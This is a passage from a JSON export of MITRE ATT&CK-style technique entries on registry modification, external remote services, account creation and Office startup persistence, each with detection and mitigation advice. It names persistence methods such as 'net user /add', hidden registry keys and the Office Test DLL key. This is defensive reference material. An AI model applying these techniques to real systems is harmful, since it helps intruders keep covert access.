href=\"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc725622(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Net Localgroup)</a> <a href=\"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754051(v=ws.11)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Net Group)</a> On Linux, adversaries may use the <code>usermod</code> command for the same purpose. <a href=\"https://www.man7.org/linux/man-pages/man8/usermod.8.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Usermod)</a>\n\nFor example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage Remote Desktop Protocol to log into the endpoints in the future. <a href=\"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft RDP Logons)</a> Adversaries may also add accounts to VPN user groups to gain future persistence on the network. <a href=\"https://cybersecuritynews.com/superblack-actors-exploiting-two-fortinet-vulnerabilities/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyber Security News)</a> On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage Sudo and Sudo Caching for elevated privileges. \n\nIn Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain. <a href=\"https://rootdse.org/posts/monitoring-realtime-activedirectory-domain-scenarios\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RootDSE AD Detection 2022)</a>","detection":"","platforms":["Windows","macOS","Linux"],"dataSources":["User Account: User Account Modification"],"mitigations":[]}]},{"id":"T1112","name":"Modify Registry","description":"Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\n\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. <a href=\"https://technet.microsoft.com/en-us/library/cc732643.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Reg)</a> Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\n\nThe Registry may be modified in order to hide configuration information or malicious payloads via Obfuscated Files or Information. <a href=\"https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 BabyShark Feb 2019)</a> <a href=\"https://arxiv.org/pdf/2102.04796\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Avaddon Ransomware 2021)</a> <a href=\"https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft BlackCat Jun 2022)</a> <a href=\"https://www.cisa.gov/news-events/alerts/2018/03/15/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA Russian Gov Critical Infra 2018)</a> The Registry may also be modified to impair defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory. <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA LockBit 2023)</a> <a href=\"https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 BabyShark Feb 2019)</a>\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. <a href=\"https://technet.microsoft.com/en-us/library/cc754820.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Remote)</a> Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.\n\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. <a href=\"https://docs.microsoft.com/sysinternals/downloads/reghide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Reghide NOV 2006)</a> Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro POWELIKS AUG 2014)</a> <a href=\"https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Hiding Reg Jul 2017)</a>","detection":"Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). <a href=\"https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft 4657 APR 2017)</a> Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. <a href=\"https://docs.microsoft.com/sysinternals/downloads/reghide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Reghide NOV 2006)</a> Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns <a href=\"https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Hiding Reg Jul 2017)</a> and RegDelNull <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft RegDelNull July 2016)</a>.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","Process: OS API Execution","Network Traffic: Network Traffic Flow","Command: Command Execution","Windows Registry: Windows Registry Key Deletion","Windows Registry: Windows Registry Key Creation","Process: Process Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."}],"subTechniques":[]},{"id":"T1133","name":"External Remote Services","description":"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally. <a href=\"https://support.apple.com/guide/remote-desktop/set-up-a-computer-running-vnc-software-apdbed09830/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MacOS VNC software for Remote Desktop)</a>\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. <a href=\"https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity Virtual Private Keylogging)</a> Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard. <a href=\"https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Exposed Docker Server)</a> <a href=\"https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Hildegard Malware)</a>\n\nAdversaries may also establish persistence on network by configuring a Tor hidden service on a compromised system. Adversaries may utilize the tool <code>ShadowLink</code> to facilitate the installation and configuration of the Tor hidden service. Tor hidden service is then accessible via the Tor network because <code>ShadowLink</code> sets up a .onion address on the compromised system. <code>ShadowLink</code> may be used to forward any inbound connections to RDP, allowing the adversaries to have remote access. <a href=\"https://www.microsoft.com/en-us/security/blog/2025/02/12/the-badpilot-campaign-seashell-blizzard-subgroup-conducts-multiyear-global-access-operation/?ref=thestack.technology\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: The BadPilot campaign)</a> Adversaries may get <code>ShadowLink</code> to persist on a system by masquerading it as an MS Defender application. <a href=\"https://www.microsoft.com/en-us/security/security-insider/intelligence-reports/russian-threat-actors-dig-in-prepare-to-seize-on-war-fatigue\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Russian threat actors dig in, prepare to seize on war fatigue)</a>","detection":"Follow best practices for detecting adversary use of Valid Accounts for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.\n\nWhen authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.","platforms":["Containers","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow","Logon Session: Logon Session Metadata","Application Log: Application Log Content","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Restrict all traffic to and from public Tor nodes. <a href=\"https://www.cisa.gov/sites/default/files/publications/AA20-183A_Defending_Against_Malicious_Cyber_Activity_Originating_from_Tor_S508C.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Defending Against Malicious Cyber Activity Originating from Tor)</a>"},{"id":"M1030","name":"Network Segmentation","description":"Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of Multi-Factor Authentication Interception techniques for some two-factor authentication implementations."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable or block remotely available services that may be unnecessary."}],"subTechniques":[]},{"id":"T1136","name":"Create Account","description":"Adversaries may create an account to maintain access to victim systems. <a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/wastedlocker-ransomware-us\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec WastedLocker June 2020)</a> With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.","detection":"Monitor for processes and command-line parameters associated with account creation, such as <code>net user</code> or <code>useradd</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft User Creation Event)</a> Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.\n\nCollect usage logs from cloud administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.","platforms":["Windows","IaaS","Linux","macOS","Network Devices","Containers","SaaS","Office Suite","Identity Provider","ESXi"],"dataSources":["Process: Process Creation","Command: Command Execution","User Account: User Account Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit the number of accounts with permissions to create other accounts. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1028","name":"Operating System Configuration","description":"Protect domain controllers by ensuring proper security configuration for critical servers."},{"id":"M1030","name":"Network Segmentation","description":"Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts."}],"subTechniques":[{"id":"T1136.001","name":"Local Account","description":"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account.  In Linux, the <code>useradd</code> command can be used, while on macOS systems, the <code>dscl -create</code> command can be used. Local accounts may also be added to network devices, often via common Network Device CLI commands such as <code>username</code>, to ESXi servers via <code>esxcli system account add</code>, or to Kubernetes clusters using the <code>kubectl</code> utility. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/s1/sec-s1-cr-book/sec-cr-t2.html#wp1047035630\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: cisco_username_cmd)</a> <a href=\"https://kubernetes.io/docs/concepts/security/service-accounts/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Service Accounts Security)</a>\n\nAdversaries may also create new local accounts on network firewall management consoles – for example, by exploiting a vulnerable firewall management system, threat actors may be able to establish super-admin accounts that could be used to modify firewall rules and gain further access to the network. <a href=\"https://cybersecuritynews.com/superblack-actors-exploiting-two-fortinet-vulnerabilities/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyber Security News)</a>\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.","detection":"Monitor for processes and command-line parameters associated with local account creation, such as <code>net user /add</code> , <code>useradd</code> , and <code>dscl -create</code> . Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft User Creation Event)</a> Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary. For network infrastructure devices, collect AAA logging to monitor for account creations.","platforms":["Containers","ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["User Account: User Account Creation","Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit the number of accounts permitted to create other accounts. Limit the usage of local administrator accounts to be used for day-to-day operations that may expose them to potential adversaries."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts."}]},{"id":"T1136.002","name":"Domain Account","description":"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account. <a href=\"https://web.archive.org/web/20150511162820/http://windowsitpro.com/windows/netexe-reference\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Savill 1999)</a>\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.","detection":"Monitor for processes and command-line parameters associated with domain account creation, such as <code>net user /add /domain</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft User Creation Event)</a> Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","User Account: User Account Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit the number of accounts with permissions to create other accounts. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1028","name":"Operating System Configuration","description":"Protect domain controllers by ensuring proper security configuration for critical servers."},{"id":"M1030","name":"Network Segmentation","description":"Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts."}]},{"id":"T1136.003","name":"Cloud Account","description":"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system. <a href=\"https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft O365 Admin Roles)</a> <a href=\"https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Support O365 Add Another Admin, October 2019)</a> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_users_create.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Create IAM User)</a> <a href=\"https://support.google.com/cloudidentity/answer/7332836?hl=en&ref_topic=7558554\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP Create Cloud Identity Users)</a> <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/add-users-azure-active-directory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure AD Users)</a>\n\nIn addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment. <a href=\"https://learn.microsoft.com/en-us/entra/identity-platform/app-objects-and-service-principals?tabs=browser\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Entra ID Service Principals)</a> In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for Temporary Elevated Cloud Access. <a href=\"https://cloud.google.com/iam/docs/service-account-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP Service Accounts)</a> While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-ec2_instance-profiles.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Instance Profiles)</a> <a href=\"https://docs.aws.amazon.com/lambda/latest/dg/lambda-intro-execution-role.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Lambda Execution Role)</a>\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding Additional Cloud Credentials or assigning Additional Cloud Roles.","detection":"Collect usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.","platforms":["IaaS","SaaS","Office Suite","Identity Provider"],"dataSources":["User Account: User Account Creation"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit the number of accounts with permissions to create other accounts. Do not allow privileged accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1030","name":"Network Segmentation","description":"Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of cloud systems."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts."}]}]},{"id":"T1137","name":"Office Application Startup","description":"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page. <a href=\"https://github.com/sensepost/ruler\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Ruler GitHub)</a> These persistence mechanisms can work within Outlook or be used through Office 365. <a href=\"https://blogs.technet.microsoft.com/office365security/defending-against-rules-and-forms-injection/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet O365 Outlook Rules)</a>","detection":"Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.\n\nMany Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. <a href=\"https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Outlook Forms)</a> <a href=\"https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Outlook Today Home Page)</a>\n\nMicrosoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output. <a href=\"https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Detect Outlook Forms)</a> SensePost, whose tool Ruler can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage. <a href=\"https://github.com/sensepost/notruler\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost NotRuler)</a>","platforms":["Windows","Office Suite"],"dataSources":["File: File Creation","Application Log: Application Log Content","Windows Registry: Windows Registry Key Modification","File: File Modification","Module: Module Load","Process: Process Creation","Windows Registry: Windows Registry Key Creation","Command: Command Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Follow Office macro security best practices suitable for your environment. Disable Office VBA macros from executing.\n\nDisable Office add-ins. If they are required, follow best practices for securing them by requiring them to be signed and disabling user notification for allowing add-ins. For some add-ins types (WLL, VBA) additional mitigation is likely required as disabling add-ins in the Office Trust Center does not disable WLL nor does it prevent VBA code from executing. <a href=\"https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MRWLabs Office Persistence Add-ins)</a>"},{"id":"M1051","name":"Update Software","description":"For the Outlook methods, blocking macros may be ineffective as the Visual Basic engine used for these features is separate from the macro scripting engine. <a href=\"https://sensepost.com/blog/2017/outlook-forms-and-shells/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Forms)</a> Microsoft has released patches to try to address each issue. Ensure KB3191938 which blocks Outlook Visual Basic and displays a malicious code warning, KB4011091 which disables custom forms by default, and KB4011162 which removes the legacy Home Page feature, are applied to systems. <a href=\"https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SensePost Outlook Home Page)</a>"},{"id":"M1054","name":"Software Configuration","description":"For the Office Test method, create the Registry key used to execute it and set the permissions to \"Read Control\" to prevent easy access to the key without administrator permissions or requiring Privilege Escalation. <a href=\"https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Office Test Sofacy)</a>"}],"subTechniques":[{"id":"T1137.001","name":"Office Template Macros","description":"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. <a href=\"https://support.office.com/article/Change-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Change Normal Template)</a>\n\nOffice Visual Basic for Applications (VBA) macros <a href=\"https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN VBA in Office)</a> can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. <a href=\"https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: enigma0x3 normal.dotm)</a> <a href=\"http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hexacorn Office Template Macros)</a> Shared templates may also be stored and pulled from remote locations. <a href=\"https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GlobalDotName Jun 2019)</a> \n\nWord Normal.dotm location:<br>\n<code>C:\\Users\\&amp;lt;username&amp;gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<br>\n<code>C:\\Users\\&amp;lt;username&amp;gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location. <a href=\"https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GlobalDotName Jun 2019)</a> \n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.","detection":"Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. <a href=\"https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Outlook Forms)</a> <a href=\"https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Outlook Today Home Page)</a> Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated. <a href=\"https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GlobalDotName Jun 2019)</a>","platforms":["Office Suite","Windows"],"dataSources":["File: File Creation","Windows Registry: Windows Registry Key Modification","Command: Command Execution","Process: Process Creation","Windows Registry: Windows Registry Key Creation","File: File Modification"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Follow Office macro security best practices suitable for your environment. Disable Office VBA macros from executing.\n\nDisable Office add-ins. If they are required, follow best practices for securing them by requiring them to be signed and disabling user notification for allowing add-ins. For some add-ins types (WLL, VBA) additional mitigation is likely required as disabling add-ins in the Office Trust Center does not disable WLL nor does it prevent VBA code from executing. <a href=\"https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MRWLabs Office Persistence Add-ins)</a>"}]},{"id":"T1137.002","name":"Office Test","description":"Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation. <a href=\"http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hexacorn Office Test)</a> <a href=\"https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Office Test Sofacy)</a>\n\nThere exist user and global Registry keys for the Office Test feature, such as:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.","detection":"Monitor for the creation of the Office Test Registry key. Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Since 